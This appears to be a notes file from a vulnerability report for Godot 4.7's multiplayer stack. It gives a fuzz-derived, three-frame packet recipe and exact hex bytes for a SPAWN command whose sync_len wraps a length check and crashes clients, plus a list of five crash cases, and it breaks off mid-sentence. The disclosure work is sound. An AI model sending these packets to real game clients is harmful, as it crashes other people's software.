# killer_packets.txt — independent fuzz-derived reproductions (2026-10-06/07)
#
# A mutation fuzzer driving the full MultiplayerAPI command stack against the
# stock Godot 4.7 binary (WebSocketMultiplayerPeer client, malicious-server
# harness) produced five process crashes. Each crash history was replayed and
# bisected to its killing packet; all five are the same defect as the main
# report: a NETWORK_COMMAND_SPAWN whose sync_len wraps the
# `name_len + (sync_len * 4)` check.
#
# Minimal 3-frame form (same recipe as server.py), verified 2026-10-07 on the
# stock 4.7 binary; victim exit code 3221225477 (0xC0000005) in all cases:
#
#   frame 1: 4-byte little-endian peer id (2)
#   frame 2: NETWORK_COMMAND_SIMPLIFY_PATH caching /root/World/Spawner as id 1
#   frame 3: SPAWN with the sync_len below
#
#   fuzzer killer packet (crash_15, bisected minimal prefix 522 packets):
#     e4ff01000000e90300000000008000000000537061776e65640200000007000f00
#     -> cmd bits 0-2 = 4 (SPAWN), scene_id 0xFF, cache 1, net_id 1001,
#        sync_len 0x80000000, name_len 0
#   sync_len = 0x80000000  (product wraps to 0)   -> crash, verified minimal form
#   sync_len = 0x80000001  (product wraps to 4)   -> crash, verified minimal form
#
# All five fuzzer killers and their bisected minimal prefixes:
#   crash_15: sync_len 0x80000000  prefix 522   crash_26: sync_len 0x80000000  prefix 860
#   crash_16: sync_len 0x80000001  prefix 1061  crash_31: sync_len 0x80000000  prefix 1777
#   crash_19: sync_len 0x80000001  prefix 732
# (Prefix = packets of prior state in that fuzzer round; the minimal form above
# needs only the three frames. Full replayable histories retained by the
